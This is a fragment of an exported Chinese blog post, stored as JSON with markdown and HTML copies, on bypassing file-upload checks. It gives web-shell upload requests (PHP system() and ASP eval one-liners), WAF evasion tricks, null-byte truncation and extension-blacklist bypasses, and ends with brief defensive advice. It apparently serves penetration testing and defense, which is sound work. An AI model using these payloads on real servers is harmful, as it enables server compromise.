jpg\nif(type == jpg)\n   SaveFileToPath(UploadPath.name, name)   //但在这里却是以 0x00 作为文件名截断\n//最后以 help.asp 存入路径里\n```\n#### 8.WAF绕过\n##### 8.1 垃圾数据\n　　有些主机WAF软件为了不影响web服务器的性能，会对校验的用户数据设置大小上限，比如1M。此种情况可以构造一个大文件，前面1M的内容为垃圾内容，后面才是真正的木马内容，便可以绕过WAF对文件内容的校验；\n![](/upload_image/20160922/1.png)\n当然也可以将垃圾数据放在数据包最开头，这样便可以绕过对文件名的校验。\n![](/upload_image/20160922/2.png)\n可以将垃圾数据加上Content-Disposition参数后面，参数内容过长，可能会导致waf检测出错。\n##### 8.2 filename\n针对早期版本安全狗，可以多加一个filename\n![](/upload_image/20160922/3.png)\n或者将filename换位置，在IIS6.0下如果我们换一种书写方式，把filename放在其他地方：\n![](/upload_image/20160922/13.png)\n##### 8.3 POST/GET\n有些WAF的规则是：如果数据包为POST类型，则校验数据包内容。\n此种情况可以上传一个POST型的数据包，抓包将POST改为GET。\n##### 8.4 以上方式\n针对WAF，以上介绍的服务器解析漏洞、文件包含漏洞等都可以尝试绕过。\n\n\n*------------------------------------------------2017.2.6更新--------------------------------------------------*\n##### 8.5 利用waf本身缺陷\n###### 删除实体里面的Conten-Type字段\n![](/upload_image/20160922/4.png)\n第一种是删除Content整行，第二种是删除C后面的字符。删除掉ontent-Type: image/jpeg只留下c，将.php加c后面即可，但是要注意额，双引号要跟着c.php。\n```bash\n正常包：Content-Disposition: form-data; name=\"image\"; filename=\"085733uykwusqcs8vw8wky.png\"Content-Type: image/png\n构造包：Content-Disposition: form-data; name=\"image\"; filename=\"085733uykwusqcs8vw8wky.png\nC.php\"\n```\n###### 删除Content-Disposition字段里的空格\n![](/upload_image/20160922/5.png)\n增加一个空格导致安全狗被绕过案列：\nContent-Type: multipart/form-data; boundary=---------------------------4714631421141173021852555099\n尝试在boundary后面加个空格或者其他可被正常处理的字符：\nboundary= ---------------------------47146314211411730218525550\n###### 修改Content-Disposition字段值的大小写\n![](/upload_image/20160922/6.png)\n\n###### Boundary边界不一致\n每次文件上传时的Boundary边界都是一致的：\n```bash\nContent-Type: multipart/form-data; boundary=---------------------------4714631421141173021852555099\nContent-Length: 253\n-----------------------------4714631421141173021852555099\nContent-Disposition: form-data; name=\"file1\"; filename=\"shell.asp\"\nContent-Type: application/octet-stream\n\n<%eval request(\"a\")%>\n-----------------------------4714631421141173021852555099--\n```\n但如果容器在处理的过程中并没有严格要求一致的话可能会导致一个问题，两段Boundary不一致使得waf认为这段数据是无意义的，可是容器并没有那么严谨：\nWin2k3 + IIS6.0 + ASP\n![](/upload_image/20160922/7.png)\n\n###### 文件名处回车\n![](/upload_image/20160922/8.png)\n###### 多个Content-Disposition\n在IIS的环境下，上传文件时如果存在多个Content-Disposition的话，IIS会取第一个Content-Disposition中的值作为接收参数，而如果waf只是取最后一个的话便会被绕过，Win2k8 + IIS7.0 + PHP\n![](/upload_image/20160922/9.png)\n\n##### 利用NTFS ADS特性\nADS是NTFS磁盘格式的一个特性，用于NTFS交换数据流。在上传文件时，如果waf对请求正文的filename匹配不当的话可能会导致绕过。\n![](/upload_image/20160922/10.png)\n\n#### 其他情况补充\n##### 文件重命名绕过\n如果web程序会将filename除了扩展名的那段重命名的话，那么还可以构造更多的点、符号等等。\n![](/upload_image/20160922/11.png)\n\n##### 特殊的长文件名绕过\n文件名使用非字母数字，比如中文等最大程度的拉长，不行的话再结合一下其他的特性进行测试：\nshell.asp;王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王.jpg\n\n##### 反删除\n将下图file1改成了file4，这样就不会把这个文件删除了。（JCMS漏洞）\n![](/upload_image/20160922/12.png)\n\n<hr>\n### 文件校验的几点建议\n* 文件扩展名服务端白名单校验。\n* 文件内容服务端校验。\n* 上传文件重命名。\n* 隐藏上传文件路径。\n\n　　以上几点，可以防御绝大多数上传漏洞，但是需要跟服务器容器结合起来。如果解析漏洞依然存在，那么没有绝对的安全。\n\n\n\n参考文章：\n[https://xianzhi.aliyun.com/forum/read/458.html?fpage=2](https://xianzhi.aliyun.com/forum/read/458.html?fpage=2)\n*还有一篇tools上大牛的文章，url暂时找不到了......*","slug":"上传木马姿势汇总-欢迎补充","published":1,"updated":"2017-02-14T01:12:03.338Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciz80dybj00153ofv9cj0v25g","content":"<p>　　文件上传漏洞可以说是日常渗透测试用得最多的一个漏洞，因为用它获得服务器权限最快最直接。但是想真正把这个漏洞利用好却不那么容易，其中有很多技巧，也有很多需要掌握的知识。俗话说，知己知彼方能百战不殆，因此想要研究怎么防护漏洞，就要了解怎么去利用。此篇文章主要分三部分：总结一些常见的上传文件校验方式，以及绕过校验的各种姿势，最后对此漏洞提几点防护建议。（根据个人经验总结，欢迎补充纠错~~）<br><a id=\"more\"></a></p>\n<h3 id=\"文件上传校验姿势\"><a href=\"#文件上传校验姿势\" class=\"headerlink\" title=\"文件上传校验姿势\"></a>文件上传校验姿势</h3><ul>\n<li>客户端javascript校验（一般只校验后缀名）</li>\n<li>服务端校验<ul>\n<li>文件头content-type字段校验（image/gif）</li>\n<li>文件内容头校验（GIF89a）</li>\n<li>后缀名黑名单校验</li>\n<li>后缀名白名单校验</li>\n<li>自定义正则校验</li>\n</ul>\n</li>\n<li>WAF设备校验（根据不同的WAF产品而定）</li>\n</ul>\n<h4 id=\"1-客户端校验\"><a href=\"#1-客户端校验\" class=\"headerlink\" title=\"1.客户端校验\"></a>1.客户端校验</h4><p>　　一般都是在网页上写一段javascript脚本，校验上传文件的后缀名，有白名单形式也有黑名单形式。<br>　　判断方式：在浏览加载文件，但还未点击上传按钮时便弹出对话框，内容如：只允许上传.jpg/.jpeg/.png后缀名的文件，而此时并没有发送数据包。</p>\n<h4 id=\"2-服务端校验\"><a href=\"#2-服务端校验\" class=\"headerlink\" title=\"2.服务端校验\"></a>2.服务端校验</h4><h5 id=\"2-1-content-type字段校验\"><a href=\"#2-1-content-type字段校验\" class=\"headerlink\" title=\"2.1 content-type字段校验\"></a>2.1 content-type字段校验</h5><p>　　这里以PHP代码为例，模拟web服务器端的校验代码<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;?php</div><div class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"variable\">$_FILES</span>[<span class=\"string\">'userfile'</span>][<span class=\"string\">'type'</span>] != <span class=\"string\">\"image/gif\"</span>)  <span class=\"comment\">#这里对上传的文件类型进行判断，如果不是image/gif类型便返回错误。</span></div><div class=\"line\">                &#123;   </div><div class=\"line\">                 <span class=\"built_in\">echo</span> <span class=\"string\">\"Sorry, we only allow uploading GIF images\"</span>;</div><div class=\"line\">                 <span class=\"built_in\">exit</span>;</div><div class=\"line\">                 &#125;</div><div class=\"line\">         <span class=\"variable\">$uploaddir</span> = <span class=\"string\">'uploads/'</span>;</div><div class=\"line\">         <span class=\"variable\">$uploadfile</span> = <span class=\"variable\">$uploaddir</span> . basename(<span class=\"variable\">$_FILES</span>[<span class=\"string\">'userfile'</span>][<span class=\"string\">'name'</span>]);</div><div class=\"line\">         <span class=\"keyword\">if</span> (move_uploaded_file(<span class=\"variable\">$_FILES</span>[<span class=\"string\">'userfile'</span>][<span class=\"string\">'tmp_name'</span>], <span class=\"variable\">$uploadfile</span>))</div><div class=\"line\">             &#123;</div><div class=\"line\">                 <span class=\"built_in\">echo</span> <span class=\"string\">\"File is valid, and was successfully uploaded.\\n\"</span>;</div><div class=\"line\">                &#125; <span class=\"keyword\">else</span> &#123;</div><div class=\"line\">                     <span class=\"built_in\">echo</span> <span class=\"string\">\"File uploading failed.\\n\"</span>;</div><div class=\"line\">    &#125;</div><div class=\"line\">     ?&gt;</div></pre></td></tr></table></figure></p>\n<p>　　可以看到代码对上传文件的文件类型进行了判断，如果不是图片类型，返回错误。</p>\n<h5 id=\"2-2-文件头校验\"><a href=\"#2-2-文件头校验\" class=\"headerlink\" title=\"2.2 文件头校验\"></a>2.2 文件头校验</h5><p>　　可以通过自己写正则匹配，判断文件头内容是否符合要求，这里举几个常见的文件头对应关系：<br>（1）  .JPEG;.JPE;.JPG，”JPGGraphic File”<br>（2）  .gif，”GIF 89A”<br>（3）  .zip，”Zip Compressed”<br>（4）  .doc;.xls;.xlt;.ppt;.apr，”MS Compound Document v1 or Lotus Approach APRfile”</p>\n<p><hr></p>\n<h3 id=\"文件上传绕过校验姿势\"><a href=\"#文件上传绕过校验姿势\" class=\"headerlink\" title=\"文件上传绕过校验姿势\"></a>文件上传绕过校验姿势</h3><ul>\n<li>客户端绕过（抓包改包）</li>\n<li>服务端绕过<ul>\n<li>文件类型</li>\n<li>文件头</li>\n<li>文件后缀名</li>\n</ul>\n</li>\n<li>配合文件包含漏洞绕过</li>\n<li>配合服务器解析漏洞绕过</li>\n<li>CMS、编辑器漏洞绕过</li>\n<li>配合操作系统文件命名规则绕过</li>\n<li>配合其他规则绕过</li>\n<li>WAF绕过</li>\n</ul>\n<h4 id=\"1-客户端绕过\"><a href=\"#1-客户端绕过\" class=\"headerlink\" title=\"1.客户端绕过\"></a>1.客户端绕过</h4><p>　　可以利用burp抓包改包，先上传一个gif类型的木马，然后通过burp将其改为asp/php/jsp后缀名即可。</p>\n<h4 id=\"2-服务端绕过\"><a href=\"#2-服务端绕过\" class=\"headerlink\" title=\"2.服务端绕过\"></a>2.服务端绕过</h4><h5 id=\"2-1-文件类型绕过\"><a href=\"#2-1-文件类型绕过\" class=\"headerlink\" title=\"2.1 文件类型绕过\"></a>2.1 文件类型绕过</h5><p>　　我们可以通过抓包，将content-type字段改为image/gif<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div></pre></td><td class=\"code\"><pre><div class=\"line\">POST /upload.php HTTP/1.1</div><div class=\"line\">TE: deflate,gzip;q=0.3</div><div class=\"line\">Connection: TE, close</div><div class=\"line\">Host: localhost</div><div class=\"line\">User-Agent: libwww-perl/5.803</div><div class=\"line\">Content-Type: multipart/form-data; boundary=xYzZY</div><div class=\"line\">Content-Length: 155</div><div class=\"line\">--xYzZY</div><div class=\"line\">Content-Disposition: form-data; name=<span class=\"string\">\"userfile\"</span>; filename=<span class=\"string\">\"shell.php\"</span></div><div class=\"line\">Content-Type: image/gif (原为 Content-Type: text/plain)</div><div class=\"line\">&lt;?php system(<span class=\"variable\">$_GET</span>[<span class=\"string\">'command'</span>]);?&gt;</div><div class=\"line\">--xYzZY-</div></pre></td></tr></table></figure></p>\n<h5 id=\"2-2-文件头绕过\"><a href=\"#2-2-文件头绕过\" class=\"headerlink\" title=\"2.2 文件头绕过\"></a>2.2 文件头绕过</h5><p>　　在木马内容基础上再加了一些文件信息，有点像下面的结构<br>GIF89a&lt;?php phpinfo(); ?&gt;</p>\n<h5 id=\"2-3-文件后缀名绕过\"><a href=\"#2-3-文件后缀名绕过\" class=\"headerlink\" title=\"2.3 文件后缀名绕过\"></a>2.3 文件后缀名绕过</h5><p>前提：黑名单校验<br>黑名单检测：一般有个专门的 blacklist 文件，里面会包含常见的危险脚本文件。<br>绕过方法：<br>（1）找黑名单扩展名的漏网之鱼 - 比如 asa 和 cer 之类<br>（2）可能存在大小写绕过漏洞 - 比如 aSp 和 pHp 之类<br>能被解析的文件扩展名列表：<br>jsp  jspx  jspf<br>asp  asa  cer  aspx<br>php  php  php3  php4<br>exe  exee</p>\n<h4 id=\"3-配合文件包含漏洞\"><a href=\"#3-配合文件包含漏洞\" class=\"headerlink\" title=\"3.配合文件包含漏洞\"></a>3.配合文件包含漏洞</h4><p>前提：校验规则只校验当文件后缀名为asp/php/jsp的文件内容是否为木马。<br>绕过方式：（这里拿php为例，此漏洞主要存在于PHP中）<br>（1）先上传一个内容为木马的txt后缀文件，因为后缀名的关系没有检验内容；<br>（2）然后再上传一个.php的文件，内容为&lt;?php Include(“上传的txt文件路径”);?&gt;<br>此时，这个php文件就会去引用txt文件的内容，从而绕过校验，下面列举包含的语法：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#PHP    </span></div><div class=\"line\">&lt;?php Include(<span class=\"string\">\"上传的txt文件路径\"</span>);?&gt; </div><div class=\"line\"><span class=\"comment\">#ASP    </span></div><div class=\"line\">&lt;!--<span class=\"comment\">#include file=\"上传的txt文件路径\" --&gt;</span></div><div class=\"line\"><span class=\"comment\">#JSP    </span></div><div class=\"line\">&lt;jsp:inclde page=<span class=\"string\">\"上传的txt文件路径\"</span>/&gt;</div><div class=\"line\">or  </div><div class=\"line\">&lt;%@include file=<span class=\"string\">\"上传的txt文件路径\"</span>%&gt;</div></pre></td></tr></table></figure></p>\n<h4 id=\"4-配合服务器解析漏洞\"><a href=\"#4-配合服务器解析漏洞\" class=\"headerlink\" title=\"4.配合服务器解析漏洞\"></a>4.配合服务器解析漏洞</h4><p>详细可参考：<a href=\"http://thief.one/2016/09/21/服务器解析漏洞/\">http://thief.one/2016/09/21/服务器解析漏洞/</a></p>\n<h4 id=\"5-配合操作系统文件命令规则\"><a href=\"#5-配合操作系统文件命令规则\" class=\"headerlink\" title=\"5.配合操作系统文件命令规则\"></a>5.配合操作系统文件命令规则</h4><p>（1）上传不符合windows文件命名规则的文件名<br>　　test.asp.<br>　　test.asp(空格)<br>　　test.php:1.jpg<br>　　test.php::$DATA<br>　　shell.php::$DATA…….<br>会被windows系统自动去掉不符合规则符号后面的内容。<br>（2）linux下后缀名大小写<br>在linux下，如果上传php不被解析，可以试试上传pHp后缀的文件名。</p>\n<h4 id=\"6-CMS、编辑器漏洞\"><a href=\"#6-CMS、编辑器漏洞\" class=\"headerlink\" title=\"6.CMS、编辑器漏洞\"></a>6.CMS、编辑器漏洞</h4><p>（1）CMS漏洞：比如说JCMS等存在的漏洞，可以针对不同CMS存在的上传漏洞进行绕过。<br>（2）编辑器漏洞：比如FCK，ewebeditor等，可以针对编辑器的漏洞进行绕过。<br>这两方面的漏洞以后单独成文汇总，这里点到为止。</p>\n<h4 id=\"7-配合其他规则\"><a href=\"#7-配合其他规则\" class=\"headerlink\" title=\"7.配合其他规则\"></a>7.配合其他规则</h4><p>（1）0x00截断：基于一个组合逻辑漏洞造成的，通常存在于构造上传文件路径的时候<br>　　test.php(0x00).jpg<br>　　test.php%00.jpg<br>　　路径/upload/1.php(0x00)，文件名1.jpg，结合/upload/1.php(0x00)/1.jpg<br>伪代码演示：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\">name= getname(httprequest) //假如这时候获取到的文件名是 help.asp.jpg(asp 后面为 0x00)</div><div class=\"line\"><span class=\"built_in\">type</span> =gettype(name)        //而在 gettype()函数里处理方式是从后往前扫描扩展名，所以判断为 jpg</div><div class=\"line\"><span class=\"keyword\">if</span>(<span class=\"built_in\">type</span> == jpg)</div><div class=\"line\">   SaveFileToPath(UploadPath.name, name)   //但在这里却是以 0x00 作为文件名截断</div><div class=\"line\">//最后以 help.asp 存入路径里</div></pre></td></tr></table></figure></p>\n<h4 id=\"8-WAF绕过\"><a href=\"#8-WAF绕过\" class=\"headerlink\" title=\"8.WAF绕过\"></a>8.WAF绕过</h4><h5 id=\"8-1-垃圾数据\"><a href=\"#8-1-垃圾数据\" class=\"headerlink\" title=\"8.1 垃圾数据\"></a>8.1 垃圾数据</h5><p>　　有些主机WAF软件为了不影响web服务器的性能，会对校验的用户数据设置大小上限，比如1M。此种情况可以构造一个大文件，前面1M的内容为垃圾内容，后面才是真正的木马内容，便可以绕过WAF对文件内容的校验；<br><img src=\"/upload_image/20160922/1.png\" alt=\"\"><br>当然也可以将垃圾数据放在数据包最开头，这样便可以绕过对文件名的校验。<br><img src=\"/upload_image/20160922/2.png\" alt=\"\"><br>可以将垃圾数据加上Content-Disposition参数后面，参数内容过长，可能会导致waf检测出错。</p>\n<h5 id=\"8-2-filename\"><a href=\"#8-2-filename\" class=\"headerlink\" title=\"8.2 filename\"></a>8.2 filename</h5><p>针对早期版本安全狗，可以多加一个filename<br><img src=\"/upload_image/20160922/3.png\" alt=\"\"><br>或者将filename换位置，在IIS6.0下如果我们换一种书写方式，把filename放在其他地方：<br><img src=\"/upload_image/20160922/13.png\" alt=\"\"></p>\n<h5 id=\"8-3-POST-GET\"><a href=\"#8-3-POST-GET\" class=\"headerlink\" title=\"8.3 POST/GET\"></a>8.3 POST/GET</h5><p>有些WAF的规则是：如果数据包为POST类型，则校验数据包内容。<br>此种情况可以上传一个POST型的数据包，抓包将POST改为GET。</p>\n<h5 id=\"8-4-以上方式\"><a href=\"#8-4-以上方式\" class=\"headerlink\" title=\"8.4 以上方式\"></a>8.4 以上方式</h5><p>针对WAF，以上介绍的服务器解析漏洞、文件包含漏洞等都可以尝试绕过。</p>\n<p><em>————————————————2017.2.6更新————————————————–</em></p>\n<h5 id=\"8-5-利用waf本身缺陷\"><a href=\"#8-5-利用waf本身缺陷\" class=\"headerlink\" title=\"8.5 利用waf本身缺陷\"></a>8.5 利用waf本身缺陷</h5><h6 id=\"删除实体里面的Conten-Type字段\"><a href=\"#删除实体里面的Conten-Type字段\" class=\"headerlink\" title=\"删除实体里面的Conten-Type字段\"></a>删除实体里面的Conten-Type字段</h6><p><img src=\"/upload_image/20160922/4.png\" alt=\"\"><br>第一种是删除Content整行，第二种是删除C后面的字符。删除掉ontent-Type: image/jpeg只留下c，将.php加c后面即可，但是要注意额，双引号要跟着c.php。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">正常包：Content-Disposition: form-data; name=<span class=\"string\">\"image\"</span>; filename=<span class=\"string\">\"085733uykwusqcs8vw8wky.png\"</span>Content-Type: image/png</div><div class=\"line\">构造包：Content-Disposition: form-data; name=<span class=\"string\">\"image\"</span>; filename=<span class=\"string\">\"085733uykwusqcs8vw8wky.png</span></div><div class=\"line\">C.php\"</div></pre></td></tr></table></figure></p>\n<h6 id=\"删除Content-Disposition字段里的空格\"><a href=\"#删除Content-Disposition字段里的空格\" class=\"headerlink\" title=\"删除Content-Disposition字段里的空格\"></a>删除Content-Disposition字段里的空格</h6><p><img src=\"/upload_image/20160922/5.png\" alt=\"\"><br>增加一个空格导致安全狗被绕过案列：<br>Content-Type: multipart/form-data; boundary=—————————4714631421141173021852555099<br>尝试在boundary后面加个空格或者其他可被正常处理的字符：<br>boundary= —————————47146314211411730218525550</p>\n<h6 id=\"修改Content-Disposition字段值的大小写\"><a href=\"#修改Content-Disposition字段值的大小写\" class=\"headerlink\" title=\"修改Content-Disposition字段值的大小写\"></a>修改Content-Disposition字段值的大小写</h6><p><img src=\"/upload_image/20160922/6.png\" alt=\"\"></p>\n<h6 id=\"Boundary边界不一致\"><a href=\"#Boundary边界不一致\" class=\"headerlink\" title=\"Boundary边界不一致\"></a>Boundary边界不一致</h6><p>每次文件上传时的Boundary边界都是一致的：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\">Content-Type: multipart/form-data; boundary=---------------------------4714631421141173021852555099</div><div class=\"line\">Content-Length: 253</div><div class=\"line\">-----------------------------4714631421141173021852555099</div><div class=\"line\">Content-Disposition: form-data; name=<span class=\"string\">\"file1\"</span>; filename=<span class=\"string\">\"shell.asp\"</span></div><div class=\"line\">Content-Type: application/octet-stream</div><div class=\"line\"></div><div class=\"line\">&lt;%<span class=\"built_in\">eval</span> request(<span class=\"string\">\"a\"</span>)%&gt;</div><div class=\"line\">-----------------------------4714631421141173021852555099--</div></pre></td></tr></table></figure></p>\n<p>但如果容器在处理的过程中并没有严格要求一致的话可能会导致一个问题，两段Boundary不一致使得waf认为这段数据是无意义的，可是容器并没有那么严谨：<br>Win2k3 + IIS6.0 + ASP<br><img src=\"/upload_image/20160922/7.png\" alt=\"\"></p>\n<h6 id=\"文件名处回车\"><a href=\"#文件名处回车\" class=\"headerlink\" title=\"文件名处回车\"></a>文件名处回车</h6><p><img src=\"/upload_image/20160922/8.png\" alt=\"\"></p>\n<h6 id=\"多个Content-Disposition\"><a href=\"#多个Content-Disposition\" class=\"headerlink\" title=\"多个Content-Disposition\"></a>多个Content-Disposition</h6><p>在IIS的环境下，上传文件时如果存在多个Content-Disposition的话，IIS会取第一个Content-Disposition中的值作为接收参数，而如果waf只是取最后一个的话便会被绕过，Win2k8 + IIS7.0 + PHP<br><img src=\"/upload_image/20160922/9.png\" alt=\"\"></p>\n<h5 id=\"利用NTFS-ADS特性\"><a href=\"#利用NTFS-ADS特性\" class=\"headerlink\" title=\"利用NTFS ADS特性\"></a>利用NTFS ADS特性</h5><p>ADS是NTFS磁盘格式的一个特性，用于NTFS交换数据流。在上传文件时，如果waf对请求正文的filename匹配不当的话可能会导致绕过。<br><img src=\"/upload_image/20160922/10.png\" alt=\"\"></p>\n<h4 id=\"其他情况补充\"><a href=\"#其他情况补充\" class=\"headerlink\" title=\"其他情况补充\"></a>其他情况补充</h4><h5 id=\"文件重命名绕过\"><a href=\"#文件重命名绕过\" class=\"headerlink\" title=\"文件重命名绕过\"></a>文件重命名绕过</h5><p>如果web程序会将filename除了扩展名的那段重命名的话，那么还可以构造更多的点、符号等等。<br><img src=\"/upload_image/20160922/11.png\" alt=\"\"></p>\n<h5 id=\"特殊的长文件名绕过\"><a href=\"#特殊的长文件名绕过\" class=\"headerlink\" title=\"特殊的长文件名绕过\"></a>特殊的长文件名绕过</h5><p>文件名使用非字母数字，比如中文等最大程度的拉长，不行的话再结合一下其他的特性进行测试：<br>shell.asp;王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王.jpg</p>\n<h5 id=\"反删除\"><a href=\"#反删除\" class=\"headerlink\" title=\"反删除\"></a>反删除</h5><p>将下图file1改成了file4，这样就不会把这个文件删除了。（JCMS漏洞）<br><img src=\"/upload_image/20160922/12.png\" alt=\"\"></p>\n<p><hr></p>\n<h3 id=\"文件校验的几点建议\"><a href=\"#文件校验的几点建议\" class=\"headerlink\" title=\"文件校验的几点建议\"></a>文件校验的几点建议</h3><ul>\n<li>文件扩展名服务端白名单校验。</li>\n<li>文件内容服务端校验。</li>\n<li>上传文件重命名。</li>\n<li>隐藏上传文件路径。</li>\n</ul>\n<p>　　以上几点，可以防御绝大多数上传漏洞，但是需要跟服务器容器结合起来。如果解析漏洞依然存在，那么没有绝对的安全。</p>\n<p>参考文章：<br><a href=\"https://xianzhi.aliyun.com/forum/read/458.html?fpage=2\" target=\"_blank\" rel=\"external\">https://xianzhi.aliyun.com/forum/read/458.html?fpage=2</a><br><em>还有一篇tools上大牛的文章，url暂时找不到了……</em></p>\n","excerpt":"<p>　　文件上传漏洞可以说是日常渗透测试用得最多的一个漏洞，因为用它获得服务器权限最快最直接。但是想真正把这个漏洞利用好却不那么容易，其中有很多技巧，也有很多需要掌握的知识。俗话说，知己知彼方能百战不殆，因此想要研究怎么防护漏洞，就要了解怎么去利用。此篇文章主要分三部分：总结一些常见的上传文件校验方式，以及绕过校验的各种姿势，最后对此漏洞提几点防护建议。（根据个人经验总结，欢迎补充纠错~~）<br>","more":"</p>\n<h3 id=\"文件上传校验姿势\"><a href=\"#文件上传校验姿势\" class=\"headerlink\" title=\"文件上传校验姿势\"></a>文件上传校验姿势</h3><ul>\n<li>客户端javascript校验（一般只校验后缀名）</li>\n<li>服务端校验<ul>\n<li>文件头content-type字段校验（image/gif）</li>\n<li>文件内容头校验（GIF89a）</li>\n<li>后缀名黑名单校验</li>\n<li>后缀名白名单校验</li>\n<li>自定义正则校验</li>\n</ul>\n</li>\n<li>WAF设备校验（根据不同的WAF产品而定）</li>\n</ul>\n<h4 id=\"1-客户端校验\"><a href=\"#1-客户端校验\" class=\"headerlink\" title=\"1.客户端校验\"></a>1.客户端校验</h4><p>　　一般都是在网页上写一段javascript脚本，校验上传文件的后缀名，有白名单形式也有黑名单形式。<br>　　判断方式：在浏览加载文件，但还未点击上传按钮时便弹出对话框，内容如：只允许上传.jpg/.jpeg/.png后缀名的文件，而此时并没有发送数据包。</p>\n<h4 id=\"2-服务端校验\"><a href=\"#2-服务端校验\" class=\"headerlink\" title=\"2.服务端校验\"></a>2.服务端校验</h4><h5 id=\"2-1-content-type字段校验\"><a href=\"#2-1-content-type字段校验\" class=\"headerlink\" title=\"2.1 content-type字段校验\"></a>2.1 content-type字段校验</h5><p>　　这里以PHP代码为例，模拟web服务器端的校验代码<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;?php</div><div class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"variable\">$_FILES</span>[<span class=\"string\">'userfile'</span>][<span class=\"string\">'type'</span>] != <span class=\"string\">\"image/gif\"</span>)  <span class=\"comment\">#这里对上传的文件类型进行判断，如果不是image/gif类型便返回错误。</span></div><div class=\"line\">                &#123;   </div><div class=\"line\">                 <span class=\"built_in\">echo</span> <span class=\"string\">\"Sorry, we only allow uploading GIF images\"</span>;</div><div class=\"line\">                 <span class=\"built_in\">exit</span>;</div><div class=\"line\">                 &#125;</div><div class=\"line\">         <span class=\"variable\">$uploaddir</span> = <span class=\"string\">'uploads/'</span>;</div><div class=\"line\">         <span class=\"variable\">$uploadfile</span> = <span class=\"variable\">$uploaddir</span> . basename(<span class=\"variable\">$_FILES</span>[<span class=\"string\">'userfile'</span>][<span class=\"string\">'name'</span>]);</div><div class=\"line\">         <span class=\"keyword\">if</span> (move_uploaded_file(<span class=\"variable\">$_FILES</span>[<span class=\"string\">'userfile'</span>][<span class=\"string\">'tmp_name'</span>], <span class=\"variable\">$uploadfile</span>))</div><div class=\"line\">             &#123;</div><div class=\"line\">                 <span class=\"built_in\">echo</span> <span class=\"string\">\"File is valid, and was successfully uploaded.\\n\"</span>;</div><div class=\"line\">                &#125; <span class=\"keyword\">else</span> &#123;</div><div class=\"line\">                     <span class=\"built_in\">echo</span> <span class=\"string\">\"File uploading failed.\\n\"</span>;</div><div class=\"line\">    &#125;</div><div class=\"line\">     ?&gt;</div></pre></td></tr></table></figure></p>\n<p>　　可以看到代码对上传文件的文件类型进行了判断，如果不是图片类型，返回错误。</p>\n<h5 id=\"2-2-文件头校验\"><a href=\"#2-2-文件头校验\" class=\"headerlink\" title=\"2.2 文件头校验\"></a>2.2 文件头校验</h5><p>　　可以通过自己写正则匹配，判断文件头内容是否符合要求，这里举几个常见的文件头对应关系：<br>（1）  .JPEG;.JPE;.JPG，”JPGGraphic File”<br>（2）  .gif，”GIF 89A”<br>（3）  .zip，”Zip Compressed”<br>（4）  .doc;.xls;.xlt;.ppt;.apr，”MS Compound Document v1 or Lotus Approach APRfile”</p>\n<p><hr></p>\n<h3 id=\"文件上传绕过校验姿势\"><a href=\"#文件上传绕过校验姿势\" class=\"headerlink\" title=\"文件上传绕过校验姿势\"></a>文件上传绕过校验姿势</h3><ul>\n<li>客户端绕过（抓包改包）</li>\n<li>服务端绕过<ul>\n<li>文件类型</li>\n<li>文件头</li>\n<li>文件后缀名</li>\n</ul>\n</li>\n<li>配合文件包含漏洞绕过</li>\n<li>配合服务器解析漏洞绕过</li>\n<li>CMS、编辑器漏洞绕过</li>\n<li>配合操作系统文件命名规则绕过</li>\n<li>配合其他规则绕过</li>\n<li>WAF绕过</li>\n</ul>\n<h4 id=\"1-客户端绕过\"><a href=\"#1-客户端绕过\" class=\"headerlink\" title=\"1.客户端绕过\"></a>1.客户端绕过</h4><p>　　可以利用burp抓包改包，先上传一个gif类型的木马，然后通过burp将其改为asp/php/jsp后缀名即可。</p>\n<h4 id=\"2-服务端绕过\"><a href=\"#2-服务端绕过\" class=\"headerlink\" title=\"2.服务端绕过\"></a>2.服务端绕过</h4><h5 id=\"2-1-文件类型绕过\"><a href=\"#2-1-文件类型绕过\" class=\"headerlink\" title=\"2.1 文件类型绕过\"></a>2.1 文件类型绕过</h5><p>　　